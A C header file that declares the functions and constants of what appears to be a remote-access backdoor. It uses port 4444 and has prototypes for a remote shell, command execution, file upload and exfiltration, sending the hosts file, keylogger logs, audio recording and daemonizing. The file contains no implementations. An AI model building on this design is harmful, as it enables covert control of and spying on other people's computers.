#ifndef CONSTANTES_H_INCLUDED
#define CONSTANTES_H_INCLUDED

#include <errno.h>  //errno
#include <string.h> //strerror()
#include <stdlib.h> //printf()

#include <gtk-2.0/gtk/gtk.h>  // GtkButton
#include <gst/gst.h> //GstBus, GstMessage

#define error(expression, function)     printf("ERROR : %s\nFunction : %s\nError Number : %d\nError Message : %s\n", expression, function, errno, strerror(errno));

#define PORT    4444
#define MAXDATASIZE  200000

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket(s) close (s)

typedef int SOCKET;
typedef struct sockaddr_in SOCKADDR_IN;
typedef struct sockaddr SOCKADDR;

typedef struct _CustomData
{
    gboolean is_live;
    GstElement *pipeline;
    GMainLoop *loop;

}CustomData;

void dispatch_modules(int argc, char *argv[]);

void recv_upload(void);

void *send_dowloaded_file(void)__attribute__((noreturn));
void *send_dowloaded_binarie(void);

void *send_hosts_file(void);

void *start_remote_shell(char *argv[])__attribute__((noreturn));

void *execute_cmd(void);
void cb_message(GstBus *bus, GstMessage *msg, CustomData *data);
void *execute_record_cmd(void);

void *send_logger_log(void);

void exec_get_proces_cmd(void);

void daemonize(void);

#endif
